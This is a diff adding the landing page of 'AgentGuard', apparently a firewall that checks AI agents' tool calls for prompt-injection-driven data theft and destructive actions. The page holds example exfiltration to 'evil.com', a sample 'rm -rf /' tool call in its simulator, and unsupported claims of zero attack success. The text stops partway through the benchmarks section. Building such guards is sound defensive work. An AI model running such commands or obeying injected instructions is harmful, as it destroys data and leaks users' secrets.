@@ -1,0 +1,927 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>AASG // Autonomous Agent Security Gateway</title>
+  
+  <!-- Google Fonts: Hanken Grotesk & JetBrains Mono -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet"/>
+
+  <!-- Three.js CDN for Smooth 3D WebGL Animation -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script id="tailwind-config">
+    tailwind.config = {
+      darkMode: "class",
+      theme: {
+        extend: {
+          colors: {
+            "surface-container": "#eeeeee",
+            "on-primary": "#ffffff",
+            "on-surface-variant": "#4a4a4a",
+            "error-container": "#fef2f2",
+            "outline-variant": "#e5e5e5",
+            "on-primary-container": "#561600",
+            "surface-container-low": "#f8f9fa",
+            "surface-variant": "#e2e2e2",
+            "inverse-surface": "#1a1c1c",
+            "on-error": "#ffffff",
+            "surface": "#ffffff",
+            "primary": "#ff5e1f",
+            "primary-hover": "#e04b10",
+            "primary-container": "#ff5e1f",
+            "surface-bright": "#ffffff",
+            "on-surface": "#1a1c1c",
+            "secondary": "#5f5e5e",
+            "surface-container-highest": "#e8e8e8",
+            "on-background": "#1a1c1c",
+            "accent-glow": "#fff1c7",
+            "accent-soft": "#fff4ec",
+            "error": "#d92d20",
+            "success": "#10b981",
+            "success-soft": "#ecfdf5",
+            "background": "#fbfbfb"
+          },
+          fontFamily: {
+            sans: ["Hanken Grotesk", "sans-serif"],
+            mono: ["JetBrains Mono", "monospace"]
+          }
+        }
+      }
+    };
+  </script>
+
+  <style>
+    @layer base {
+      html, body {
+        margin: 0;
+        padding: 0;
+        scroll-behavior: smooth;
+      }
+      body {
+        font-family: 'Hanken Grotesk', sans-serif;
+        background-color: #fbfbfb;
+        color: #1a1c1c;
+      }
+    }
+    
+    /* Subtle Canvas Backdrop */
+    #hero-canvas-container {
+      position: absolute;
+      top: 0;
+      right: 0;
+      bottom: 0;
+      left: 0;
+      pointer-events: none;
+      z-index: 0;
+      opacity: 0.85;
+      overflow: hidden;
+    }
+
+    .glass-card {
+      background: rgba(255, 255, 255, 0.88);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(240, 240, 240, 0.8);
+    }
+
+    .glow-orange {
+      box-shadow: 0 8px 30px rgba(255, 94, 31, 0.18);
+    }
+  </style>
+</head>
+<body class="bg-background text-on-surface antialiased selection:bg-primary selection:text-white">
+
+  <!-- ================= TOP NAVIGATION ================= -->
+  <header class="fixed top-0 left-0 w-full z-50 bg-white/90 backdrop-blur-md border-b border-gray-100 shadow-[0_1px_10px_rgba(0,0,0,0.03)]">
+    <div class="h-20 max-w-7xl mx-auto px-6 flex items-center justify-between">
+      
+      <!-- Logo & Branding -->
+      <a href="#hero" class="flex items-center gap-3 group">
+        <div class="w-10 h-10 rounded-xl bg-primary text-white flex items-center justify-center shadow-md shadow-primary/20 transition-transform group-hover:scale-105">
+          <span class="material-symbols-outlined text-[24px]">shield_lock</span>
+        </div>
+        <div class="flex flex-col">
+          <div class="flex items-center gap-2">
+            <span class="font-bold text-lg tracking-tight text-on-surface">AgentGuard</span>
+            <span class="font-mono text-xs px-2 py-0.5 rounded bg-accent-soft text-primary font-semibold tracking-wider">AASG L7</span>
+          </div>
+          <div class="flex items-center gap-1.5 mt-0.5">
+            <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+            <span class="font-mono text-[11px] text-emerald-600 font-semibold uppercase tracking-wider">GATEWAY ACTIVE • ZERO LEAKAGE</span>
+          </div>
+        </div>
+      </a>
+
+      <!-- Navigation Links -->
+      <nav class="hidden md:flex items-center gap-1 bg-gray-100/80 p-1.5 rounded-full border border-gray-200/50">
+        <a href="#features" class="px-4 py-1.5 rounded-full text-xs font-semibold text-gray-600 hover:text-on-surface hover:bg-white transition-all">Features</a>
+        <a href="#architecture" class="px-4 py-1.5 rounded-full text-xs font-semibold text-gray-600 hover:text-on-surface hover:bg-white transition-all">6-Rule Engine</a>
+        <a href="#pipeline" class="px-4 py-1.5 rounded-full text-xs font-semibold text-gray-600 hover:text-on-surface hover:bg-white transition-all">Pipeline</a>
+        <a href="#benchmarks" class="px-4 py-1.5 rounded-full text-xs font-semibold text-gray-600 hover:text-on-surface hover:bg-white transition-all">Security Metrics</a>
+        <a href="/docs" target="_blank" class="px-4 py-1.5 rounded-full text-xs font-semibold text-gray-600 hover:text-on-surface hover:bg-white transition-all">API Specs</a>
+      </nav>
+
+      <!-- Right Action CTA Buttons -->
+      <div class="flex items-center gap-3">
+        <a href="/docs" target="_blank" class="hidden sm:inline-flex items-center gap-1.5 px-3.5 py-2 rounded-full border border-gray-200 text-xs font-semibold text-gray-700 hover:bg-gray-50 transition-colors">
+          <span class="material-symbols-outlined text-[16px]">menu_book</span>
+          <span>API Docs</span>
+        </a>
+        <a href="http://localhost:8501" target="_blank" class="h-10 px-5 rounded-full bg-primary hover:bg-primary-hover text-white text-xs font-bold flex items-center gap-2 shadow-md shadow-primary/20 transition-all hover:scale-105 active:scale-95">
+          <span>Launch Console</span>
+          <span class="material-symbols-outlined text-[16px]">arrow_forward</span>
+        </a>
+      </div>
+
+    </div>
+  </header>
+
+  <!-- ================= HERO SECTION WITH THREE.JS ================= -->
+  <section id="hero" class="relative pt-32 pb-20 md:pt-40 md:pb-28 overflow-hidden min-h-[90vh] flex items-center">
+    
+    <!-- Three.js 3D Background Canvas -->
+    <div id="hero-canvas-container">
+      <canvas id="three-canvas" class="w-full h-full block"></canvas>
+    </div>
+
+    <!-- Ambient Gradients -->
+    <div class="absolute top-20 left-1/2 -translate-x-1/2 w-[800px] h-[400px] bg-accent-glow/25 blur-[120px] pointer-events-none rounded-full"></div>
+    <div class="absolute -top-10 right-10 w-[400px] h-[400px] bg-orange-100/30 blur-[100px] pointer-events-none rounded-full"></div>
+
+    <div class="relative max-w-7xl mx-auto px-6 z-10 w-full">
+      <div class="flex flex-col items-center text-center max-w-4xl mx-auto">
+        
+        <!-- Live Status Pill Badge -->
+        <div class="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-white/90 border border-orange-200/60 shadow-sm mb-6 backdrop-blur-sm animate-fade-in">
+          <span class="w-2.5 h-2.5 rounded-full bg-primary animate-ping"></span>
+          <span class="font-mono text-xs font-bold uppercase tracking-wider text-primary">Autonomous Agent Security Gateway</span>
+          <span class="text-gray-300">•</span>
+          <span class="text-xs font-medium text-gray-600">Deterministic L7 Firewall &amp; Taint Engine</span>
+        </div>
+
+        <!-- Main Headline -->
+        <h1 class="text-4xl sm:text-5xl lg:text-6xl font-extrabold text-on-surface tracking-tight leading-[1.08] mb-6">
+          Stop Autonomous AI Agents From Calling Rogue Tools &amp; Leaking Data.
+        </h1>
+
+        <!-- Subtitle -->
+        <p class="text-lg sm:text-xl text-on-surface-variant font-normal leading-relaxed max-w-2xl mb-8">
+          A deterministic Layer-7 security firewall operating between enterprise LLM agents and execution tools. We enforce mathematically verifiable boundaries based on chunk provenance, dynamic taint tracking, and strict destination policies.
+        </p>
+
+        <!-- CTA Buttons -->
+        <div class="flex flex-wrap items-center justify-center gap-4 mb-14">
+          <a href="http://localhost:8501" target="_blank" class="h-12 px-8 rounded-full bg-primary hover:bg-primary-hover text-white font-semibold text-sm flex items-center gap-2.5 shadow-lg shadow-primary/25 transition-all hover:-translate-y-0.5 cursor-pointer">
+            <span class="material-symbols-outlined text-[20px]">terminal</span>
+            <span>Open Security Console</span>
+          </a>
+          <a href="#architecture" class="h-12 px-7 rounded-full bg-white hover:bg-gray-50 border border-gray-200/90 text-on-surface font-semibold text-sm flex items-center gap-2 shadow-sm transition-all hover:-translate-y-0.5">
+            <span class="material-symbols-outlined text-[18px]">rule</span>
+            <span>Explore 6-Rule Engine</span>
+          </a>
+          <a href="#features" class="h-12 px-6 rounded-full bg-transparent hover:bg-orange-50/60 text-primary font-semibold text-sm flex items-center gap-1.5 transition-colors">
+            <span>Explore All Features</span>
+            <span class="material-symbols-outlined text-[16px]">arrow_downward</span>
+          </a>
+        </div>
+
+        <!-- 4 Hero Security Metric Tiles -->
+        <div class="w-full grid grid-cols-2 lg:grid-cols-4 gap-4 text-left">
+          
+          <div class="glass-card p-5 rounded-2xl shadow-sm hover:shadow-md transition-shadow relative overflow-hidden border-t-4 border-t-primary">
+            <div class="text-3xl lg:text-4xl font-extrabold text-primary">0.0%</div>
+            <div class="text-sm font-bold text-on-surface mt-1">Attack Success Rate</div>
+            <div class="font-mono text-[11px] text-gray-500 mt-1">Zero bypass across indirect injection benchmarks</div>
+          </div>
+
+          <div class="glass-card p-5 rounded-2xl shadow-sm hover:shadow-md transition-shadow relative overflow-hidden border-t-4 border-t-emerald-500">
+            <div class="text-3xl lg:text-4xl font-extrabold text-emerald-600">100%</div>
+            <div class="text-sm font-bold text-on-surface mt-1">Benign Task Preservation</div>
+            <div class="font-mono text-[11px] text-gray-500 mt-1">Legitimate multi-step tools execute with 0 false blocks</div>
+          </div>
+
+          <div class="glass-card p-5 rounded-2xl shadow-sm hover:shadow-md transition-shadow relative overflow-hidden border-t-4 border-t-gray-800">
+            <div class="text-3xl lg:text-4xl font-extrabold text-gray-900">&lt; 15ms</div>
+            <div class="text-sm font-bold text-on-surface mt-1">Firewall Latency</div>
+            <div class="font-mono text-[11px] text-gray-500 mt-1">Microsecond policy execution without prompt bloat</div>
+          </div>
+
+          <div class="glass-card p-5 rounded-2xl shadow-sm hover:shadow-md transition-shadow relative overflow-hidden border-t-4 border-t-orange-400">
+            <div class="text-3xl lg:text-4xl font-extrabold text-orange-500">100%</div>
+            <div class="text-sm font-bold text-on-surface mt-1">Audit Ledger Integrity</div>
+            <div class="font-mono text-[11px] text-gray-500 mt-1">Immutable SQLite provenance &amp; decision tracking</div>
+          </div>
+
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= CORE FEATURES OF AI AGENT SECURITY GUARD ================= -->
+  <section id="features" class="py-20 bg-white border-y border-gray-100">
+    <div class="max-w-7xl mx-auto px-6">
+      
+      <div class="text-center max-w-3xl mx-auto mb-16">
+        <span class="font-mono text-xs uppercase font-bold text-primary tracking-widest px-3 py-1 bg-accent-soft rounded-full">
+          Core Security Capabilities
+        </span>
+        <h2 class="text-3xl sm:text-4xl font-bold text-on-surface mt-4 tracking-tight">
+          Engineered Exclusively for Autonomous Agent Safety
+        </h2>
+        <p class="text-base text-gray-600 mt-3 leading-relaxed">
+          Traditional web application firewalls and LLM prompt filters fail because agents invoke external tools. AgentGuard wraps execution tools with deterministic runtime guarantees.
+        </p>
+      </div>
+
+      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+        
+        <!-- Feature 1: Taint Tracking -->
+        <div class="bg-gray-50/70 p-7 rounded-2xl border border-gray-200/70 hover:border-primary/40 hover:bg-white hover:shadow-lg transition-all group">
+          <div class="w-12 h-12 rounded-xl bg-orange-100 text-primary flex items-center justify-center mb-5 group-hover:scale-110 transition-transform">
+            <span class="material-symbols-outlined text-[26px]">fingerprint</span>
+          </div>
+          <h3 class="text-xl font-bold text-on-surface mb-2">Ingress Taint Tracking</h3>
+          <p class="text-sm text-gray-600 leading-relaxed">
+            Tracks provenance across multi-turn sessions. Ingested external files, web scrapes, emails, and PDFs are tagged with trust levels. If untrusted content enters the session, execution state is tainted dynamically.
+          </p>
+          <div class="mt-4 font-mono text-[11px] text-primary font-semibold flex items-center gap-1">
+            <span>Arg-level &amp; session provenance</span>
+            <span class="material-symbols-outlined text-[14px]">arrow_forward</span>
+          </div>
+        </div>
+
+        <!-- Feature 2: Deterministic 6-Rule Engine -->
+        <div class="bg-gray-50/70 p-7 rounded-2xl border border-gray-200/70 hover:border-primary/40 hover:bg-white hover:shadow-lg transition-all group">
+          <div class="w-12 h-12 rounded-xl bg-orange-100 text-primary flex items-center justify-center mb-5 group-hover:scale-110 transition-transform">
+            <span class="material-symbols-outlined text-[26px]">rule_settings</span>
+          </div>
+          <h3 class="text-xl font-bold text-on-surface mb-2">Deterministic Precedence Engine</h3>
+          <p class="text-sm text-gray-600 leading-relaxed">
+            Zero probabilistic hallucination or heuristic slippage. Tool requests are evaluated against a frozen 6-step precedence contract: allowed tools, sensitivity levels, destination whitelists, and DLP rules.
+          </p>
+          <div class="mt-4 font-mono text-[11px] text-primary font-semibold flex items-center gap-1">
+            <span>Strict mathematical containment</span>
+            <span class="material-symbols-outlined text-[14px]">arrow_forward</span>
+          </div>
+        </div>
+
+        <!-- Feature 3: Human-in-the-Loop Approvals -->
+        <div class="bg-gray-50/70 p-7 rounded-2xl border border-gray-200/70 hover:border-primary/40 hover:bg-white hover:shadow-lg transition-all group">
+          <div class="w-12 h-12 rounded-xl bg-orange-100 text-primary flex items-center justify-center mb-5 group-hover:scale-110 transition-transform">
+            <span class="material-symbols-outlined text-[26px]">person_check</span>
+          </div>
+          <h3 class="text-xl font-bold text-on-surface mb-2">Human-in-the-Loop Queue</h3>
+          <p class="text-sm text-gray-600 leading-relaxed">
+            Destructive actions (<code class="font-mono text-xs">delete_file</code>, database drops, payment authorizations) yield <span class="font-bold text-primary">NEEDS_APPROVAL</span>. Execution pauses until a verified human operator signs off.
+          </p>
+          <div class="mt-4 font-mono text-[11px] text-primary font-semibold flex items-center gap-1">
+            <span>Zero autonomous destruction</span>
+            <span class="material-symbols-outlined text-[14px]">arrow_forward</span>
+          </div>
+        </div>
+
+        <!-- Feature 4: Outbound DLP Shield -->
+        <div class="bg-gray-50/70 p-7 rounded-2xl border border-gray-200/70 hover:border-primary/40 hover:bg-white hover:shadow-lg transition-all group">
+          <div class="w-12 h-12 rounded-xl bg-orange-100 text-primary flex items-center justify-center mb-5 group-hover:scale-110 transition-transform">
+            <span class="material-symbols-outlined text-[26px]">lock</span>
+          </div>
+          <h3 class="text-xl font-bold text-on-surface mb-2">Data Exfiltration &amp; DLP Shield</h3>
+          <p class="text-sm text-gray-600 leading-relaxed">
+            Real-time payload inspection intercepts confidential tokens, API keys, private corporate memos, and customer PII before outgoing tools (<code class="font-mono text-xs">send_email</code>, <code class="font-mono text-xs">webhook</code>) can transmit data.
+          </p>
+          <div class="mt-4 font-mono text-[11px] text-primary font-semibold flex items-center gap-1">
+            <span>Prevents credential leaks</span>
+            <span class="material-symbols-outlined text-[14px]">arrow_forward</span>
+          </div>
+        </div>
+
+        <!-- Feature 5: Destination Regex Whitelisting -->
+        <div class="bg-gray-50/70 p-7 rounded-2xl border border-gray-200/70 hover:border-primary/40 hover:bg-white hover:shadow-lg transition-all group">
+          <div class="w-12 h-12 rounded-xl bg-orange-100 text-primary flex items-center justify-center mb-5 group-hover:scale-110 transition-transform">
+            <span class="material-symbols-outlined text-[26px]">domain_verification</span>
+          </div>
+          <h3 class="text-xl font-bold text-on-surface mb-2">Strict Destination Control</h3>
+          <p class="text-sm text-gray-600 leading-relaxed">
+            External network sinks are locked to pre-authorized corporate endpoints (<code class="font-mono text-xs">acme.com</code>). Even if an attacker injects a command to send data to an external domain, the firewall issues a hard BLOCK.
+          </p>
+          <div class="mt-4 font-mono text-[11px] text-primary font-semibold flex items-center gap-1">
+            <span>Stops C2 communication</span>
+            <span class="material-symbols-outlined text-[14px]">arrow_forward</span>
+          </div>
+        </div>
+
+        <!-- Feature 6: Cryptographic Audit Ledger -->
+        <div class="bg-gray-50/70 p-7 rounded-2xl border border-gray-200/70 hover:border-primary/40 hover:bg-white hover:shadow-lg transition-all group">
+          <div class="w-12 h-12 rounded-xl bg-orange-100 text-primary flex items-center justify-center mb-5 group-hover:scale-110 transition-transform">
+            <span class="material-symbols-outlined text-[26px]">database</span>
+          </div>
+          <h3 class="text-xl font-bold text-on-surface mb-2">Immutable Audit Ledger</h3>
+          <p class="text-sm text-gray-600 leading-relaxed">
+            Every ingested prompt, taint state change, tool call argument, and rule verdict is logged to SQLite with microsecond latency metrics and plain-English compliance explanations for risk officers.
+          </p>
+          <div class="mt-4 font-mono text-[11px] text-primary font-semibold flex items-center gap-1">
+            <span>Tamper-evident event provenance</span>
+            <span class="material-symbols-outlined text-[14px]">arrow_forward</span>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ================= 3-STAGE ARCHITECTURE PIPELINE ================= -->
+  <section id="pipeline" class="py-20 bg-gray-50/50">
+    <div class="max-w-7xl mx-auto px-6">
+      
+      <div class="bg-primary text-white rounded-3xl p-8 sm:p-12 shadow-xl relative overflow-hidden">
+        <div class="absolute -right-20 -bottom-20 w-96 h-96 bg-accent-glow/20 rounded-full blur-3xl pointer-events-none"></div>
+
+        <div class="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-6 mb-10">
+          <div>
+            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/20 text-white font-mono text-xs mb-3 backdrop-blur-sm">
+              <span class="w-2 h-2 rounded-full bg-accent-glow animate-ping"></span>
+              <span>L7 INLINE INTERCEPTOR PIPELINE</span>
+            </div>
+            <h2 class="text-3xl sm:text-4xl font-extrabold text-white tracking-tight">
+              How AgentGuard Enforces Deterministic Safety
+            </h2>
+          </div>
+          <div class="flex items-center gap-2 bg-black/20 px-4 py-2 rounded-full text-xs font-mono text-white/90 backdrop-blur-sm">
+            <span class="material-symbols-outlined text-[18px] text-accent-glow">verified_user</span>
+            <span>Zero-Trust Tool Boundary</span>
+          </div>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+          
+          <!-- Step 1 -->
+          <div class="bg-white text-on-surface p-6 rounded-2xl shadow-sm flex flex-col justify-between">
+            <div>
+              <div class="flex items-center justify-between mb-3">
+                <span class="font-mono text-xs font-bold text-primary uppercase">Stage 01 // Ingress</span>
+                <span class="px-2 py-0.5 rounded-full bg-accent-soft font-mono text-[11px] text-primary font-bold">Provenance</span>
+              </div>
+              <h3 class="text-xl font-bold mb-2">Provenance &amp; Taint Tagging</h3>
+              <p class="text-xs text-gray-600 leading-relaxed">
+                When an agent reads external documents, user messages, or web content, AgentGuard inspects the ingress payload, scores injection likelihood, and marks the session taint flag.
+              </p>
+            </div>
+            <div class="mt-4 bg-gray-50 p-2.5 rounded-lg font-mono text-[11px] text-gray-700 overflow-x-auto border border-gray-100">
+              <code>Chunk(id="c_42", trust=UNTRUSTED, source="invoice.pdf")</code>
+            </div>
+          </div>
+
+          <!-- Step 2 -->
+          <div class="bg-white text-on-surface p-6 rounded-2xl shadow-md ring-2 ring-accent-glow flex flex-col justify-between">
+            <div>
+              <div class="flex items-center justify-between mb-3">
+                <span class="font-mono text-xs font-bold text-primary uppercase">Stage 02 // Core Guard</span>
+                <span class="px-2 py-0.5 rounded-full bg-error-container font-mono text-[11px] text-error font-bold">decide()</span>
+              </div>
+              <h3 class="text-xl font-bold mb-2">6-Step Policy Evaluation</h3>
+              <p class="text-xs text-gray-600 leading-relaxed">
+                Before tool execution, the agent's proposed call is evaluated against frozen precedence rules. If tainted data targets an unapproved sink or exfiltrates records, it is blocked immediately.
+              </p>
+            </div>
+            <div class="mt-4 bg-gray-50 p-2.5 rounded-lg font-mono text-[11px] text-gray-700 overflow-x-auto border border-gray-100">
+              <span class="text-error font-bold">BLOCK:</span> <code>leak_while_tainted -&gt; evil.com</code>
+            </div>
+          </div>
+
+          <!-- Step 3 -->
+          <div class="bg-white text-on-surface p-6 rounded-2xl shadow-sm flex flex-col justify-between">
+            <div>
+              <div class="flex items-center justify-between mb-3">
+                <span class="font-mono text-xs font-bold text-primary uppercase">Stage 03 // Execution</span>
+                <span class="px-2 py-0.5 rounded-full bg-emerald-50 font-mono text-[11px] text-emerald-700 font-bold">Execution</span>
+              </div>
+              <h3 class="text-xl font-bold mb-2">Safe Dispatch &amp; HITL</h3>
+              <p class="text-xs text-gray-600 leading-relaxed">
+                Allowed tools proceed with microsecond overhead. Dangerous or sensitive tools pause for human approval. Blocked requests return safe fallback explanations to the agent.
+              </p>
+            </div>
+            <div class="mt-4 bg-gray-50 p-2.5 rounded-lg font-mono text-[11px] text-gray-700 overflow-x-auto border border-gray-100">
+              <span class="text-emerald-600 font-bold">ALLOWED:</span> <code>query_records(dest="internal")</code>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ================= INTERACTIVE 6-STEP DECISION MATRIX ================= -->
+  <section id="architecture" class="py-20 bg-white">
+    <div class="max-w-7xl mx-auto px-6">
+      
+      <div class="flex flex-col md:flex-row md:items-end justify-between mb-12 gap-4">
+        <div>
+          <span class="font-mono text-xs uppercase font-bold text-primary tracking-widest px-3 py-1 bg-accent-soft rounded-full">
+            Deterministic Decision Engine
+          </span>
+          <h2 class="text-3xl sm:text-4xl font-bold text-on-surface mt-4 tracking-tight">
+            The 6-Step Frozen Precedence Matrix
+          </h2>
+          <p class="text-base text-gray-600 mt-2 max-w-2xl">
+            Every tool invocation initiated by an LLM agent is evaluated against this strict precedence order in <code class="font-mono text-xs font-semibold bg-gray-100 px-1 py-0.5 rounded">guard.core.decide()</code>. No probabilistic bypass is possible.
+          </p>
+        </div>
+        <div class="text-xs font-mono text-gray-500">
+          Click any rule below to test in the simulator:
+        </div>
+      </div>
+
+      <!-- 6 Precedence Cards Grid -->
+      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4" id="matrix-grid">
+        
+        <!-- Rule 1 -->
+        <div class="cursor-pointer bg-white p-5 rounded-2xl shadow-sm hover:shadow-md transition-all border-l-4 border-l-error border border-gray-200/80" id="rule-card-1" onclick="selectRule(1)">
+          <div class="flex items-center justify-between mb-2">
+            <span class="font-mono text-xs font-bold text-gray-400">PRECEDENCE 01</span>
+            <span class="px-2 py-0.5 rounded-full bg-error-container text-error font-mono text-[11px] font-bold">BLOCK</span>
+          </div>
+          <h4 class="text-lg font-bold text-on-surface mb-1">Tool Not Allowed</h4>
+          <p class="text-xs text-gray-600 leading-relaxed">
+            If the invoked tool is not explicitly declared in <code class="font-mono text-xs">policy.allowed_tools</code>, execution is rejected immediately.
+          </p>
+          <div class="mt-3 font-mono text-[11px] text-error bg-red-50/60 px-2.5 py-1 rounded">
+            reason = "permission_denied"
+          </div>
+        </div>
+
+        <!-- Rule 2 -->
+        <div class="cursor-pointer bg-white p-5 rounded-2xl shadow-sm hover:shadow-md transition-all border-l-4 border-l-primary border border-gray-200/80" id="rule-card-2" onclick="selectRule(2)">
+          <div class="flex items-center justify-between mb-2">
+            <span class="font-mono text-xs font-bold text-gray-400">PRECEDENCE 02</span>
+            <span class="px-2 py-0.5 rounded-full bg-accent-soft text-primary font-mono text-[11px] font-bold">NEEDS_APPROVAL</span>
+          </div>
+          <h4 class="text-lg font-bold text-on-surface mb-1">Always-Approve Tool</h4>
+          <p class="text-xs text-gray-600 leading-relaxed">
+            Destructive actions listed under <code class="font-mono text-xs">always_require_approval</code> (<code class="font-mono text-xs">delete_file</code>, etc.) pause for human authorization.
+          </p>
+          <div class="mt-3 font-mono text-[11px] text-primary bg-orange-50/60 px-2.5 py-1 rounded">
+            reason = "always_require_approval"
+          </div>
+        </div>
+
+        <!-- Rule 3 -->
+        <div class="cursor-pointer bg-white p-5 rounded-2xl shadow-sm hover:shadow-md transition-all border-l-4 border-l-error border border-gray-200/80" id="rule-card-3" onclick="selectRule(3)">
+          <div class="flex items-center justify-between mb-2">
+            <span class="font-mono text-xs font-bold text-gray-400">PRECEDENCE 03</span>
+            <span class="px-2 py-0.5 rounded-full bg-error-container text-error font-mono text-[11px] font-bold">BLOCK</span>
+          </div>
+          <h4 class="text-lg font-bold text-on-surface mb-1">Non-Whitelisted Sink</h4>
+          <p class="text-xs text-gray-600 leading-relaxed">
+            Tool is a registered sink (<code class="font-mono text-xs">http_post</code>, <code class="font-mono text-xs">send_email</code>), but destination violates strict corporate regex whitelist.
+          </p>
+          <div class="mt-3 font-mono text-[11px] text-error bg-red-50/60 px-2.5 py-1 rounded">
+            reason = "destination_not_allowed"
+          </div>
+        </div>
+
+        <!-- Rule 4 -->
+        <div class="cursor-pointer bg-white p-5 rounded-2xl shadow-sm hover:shadow-md transition-all border-l-4 border-l-error border border-gray-200/80" id="rule-card-4" onclick="selectRule(4)">
+          <div class="flex items-center justify-between mb-2">
+            <span class="font-mono text-xs font-bold text-gray-400">PRECEDENCE 04</span>
+            <span class="px-2 py-0.5 rounded-full bg-error-container text-error font-mono text-[11px] font-bold">BLOCK</span>
+          </div>
+          <h4 class="text-lg font-bold text-on-surface mb-1">Leak While Tainted</h4>
+          <p class="text-xs text-gray-600 leading-relaxed">
+            DLP regex matches sensitive tokens (API keys, SSNs, credit cards) while current session state is marked as tainted.
+          </p>
+          <div class="mt-3 font-mono text-[11px] text-error bg-red-50/60 px-2.5 py-1 rounded">
+            reason = "leak_while_tainted"
+          </div>
+        </div>
+
+        <!-- Rule 5 -->
+        <div class="cursor-pointer bg-white p-5 rounded-2xl shadow-sm hover:shadow-md transition-all border-l-4 border-l-primary border border-gray-200/80" id="rule-card-5" onclick="selectRule(5)">
+          <div class="flex items-center justify-between mb-2">
+            <span class="font-mono text-xs font-bold text-gray-400">PRECEDENCE 05</span>
+            <span class="px-2 py-0.5 rounded-full bg-accent-soft text-primary font-mono text-[11px] font-bold">NEEDS_APPROVAL</span>
+          </div>
+          <h4 class="text-lg font-bold text-on-surface mb-1">Untrusted Influence on Sink</h4>
+          <p class="text-xs text-gray-600 leading-relaxed">
+            Tool is a sink, session is tainted, AND session has previously observed confidential internal data. Pauses for security team sign-off.
+          </p>
+          <div class="mt-3 font-mono text-[11px] text-primary bg-orange-50/60 px-2.5 py-1 rounded">
+            reason = "untrusted_influence_on_sink"
+          </div>
+        </div>
+
+        <!-- Rule 6 -->
+        <div class="cursor-pointer bg-white p-5 rounded-2xl shadow-sm hover:shadow-md transition-all border-l-4 border-l-emerald-500 border border-gray-200/80" id="rule-card-6" onclick="selectRule(6)">
+          <div class="flex items-center justify-between mb-2">
+            <span class="font-mono text-xs font-bold text-gray-400">PRECEDENCE 06</span>
+            <span class="px-2 py-0.5 rounded-full bg-emerald-50 text-emerald-700 font-mono text-[11px] font-bold">ALLOW</span>
+          </div>
+          <h4 class="text-lg font-bold text-on-surface mb-1">Default Allow Passage</h4>
+          <p class="text-xs text-gray-600 leading-relaxed">
+            None of the restrictive conditions fired. Tool is clean, session provenance is intact, and operation passes safely.
+          </p>
+          <div class="mt-3 font-mono text-[11px] text-emerald-700 bg-emerald-50 px-2.5 py-1 rounded">
+            reason = "default_allow"
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Live Interactive Simulator Terminal -->
+      <div class="mt-8 bg-inverse-surface text-white p-6 rounded-2xl font-mono text-xs shadow-xl" id="simulator-terminal">
+        <div class="flex items-center justify-between pb-4 border-b border-gray-800">
+          <div class="flex items-center gap-2">
+            <span class="w-3 h-3 rounded-full bg-error inline-block"></span>
+            <span class="w-3 h-3 rounded-full bg-primary inline-block"></span>
+            <span class="w-3 h-3 rounded-full bg-emerald-500 inline-block"></span>
+            <span class="ml-2 text-gray-400 font-bold uppercase tracking-wider">AASG // PIPELINE VERDICT INSPECTOR</span>
+          </div>
+          <span class="text-primary text-[11px] font-bold" id="sim-status">CLICK A RULE ABOVE TO SIMULATE</span>
+        </div>
+
+        <div class="pt-4 grid grid-cols-1 md:grid-cols-3 gap-6" id="sim-body">
+          <div class="space-y-1">
+            <div class="text-gray-500 uppercase tracking-wider text-[10px]">// INCOMING AGENT CALL</div>
+            <div class="text-white font-semibold" id="sim-call">ToolCall(name="bash_exec", args={"cmd": "rm -rf /"})</div>
+            <div class="text-gray-500 uppercase tracking-wider text-[10px] mt-3">// SESSION STATE</div>
+            <div class="text-accent-glow" id="sim-state">session.tainted = True, seen_confidential = False</div>
+          </div>
+          <div class="space-y-1">
+            <div class="text-gray-500 uppercase tracking-wider text-[10px]">// ACTIVE POLICY RULE TEST</div>
+            <div class="text-orange-300 font-semibold" id="sim-test">rule_1: call.name in policy.allowed_tools? → FALSE</div>
+            <div class="text-gray-500 uppercase tracking-wider text-[10px] mt-3">// INTERCEPTION DURATION</div>
+            <div class="text-emerald-400" id="sim-lat">Evaluation latency: 0.18ms</div>
+          </div>
+          <div class="bg-white/5 p-4 rounded-xl flex flex-col justify-between border border-white/10">
+            <div class="text-gray-400 uppercase tracking-wider text-[10px]">// VERDICT RESULT</div>
+            <div class="text-2xl font-bold text-error my-1" id="sim-verdict">BLOCK</div>
+            <div class="text-gray-400 text-[11px]" id="sim-reason">reason="permission_denied"</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ================= BENCHMARKS & EVALUATION ================= -->
+  <section id="benchmarks" class="py-20 bg-gray-50 border-t border-gray-100">
+    <div class="max-w-7xl mx-auto px-6">
+      
+      <div class="text-center max-w-3xl mx-auto mb-16">
+        <span class="font-mono text-xs uppercase font-bold text-primary tracking-widest px-3 py-1 bg-accent-soft rounded-full">
+          Empirical Security Evaluation
+        </span>
+        <h2 class="text-3xl sm:text-4xl font-bold text-on-surface mt-4 tracking-tight">
+          Attack Success Rate vs. Benign Preservation
+        </h2>
+        <p class="text-base text-gray-600 mt-2">
+          Comparative benchmark across 100 automated prompt injection vectors, data exfiltration tasks, and destructive operations.
